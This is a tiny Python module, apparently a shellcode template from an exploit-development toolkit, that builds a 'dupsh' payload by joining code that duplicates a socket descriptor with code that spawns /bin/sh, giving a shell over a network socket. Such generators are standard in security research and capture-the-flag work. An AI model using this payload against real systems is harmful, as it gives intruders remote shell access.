# dupsh(sock, cmd)

import dup
import sh

def generate(sock=4, cmd='/bin/sh'):
    sc = dup.generate(sock)
    sc += sh.generate(cmd)
    return sc
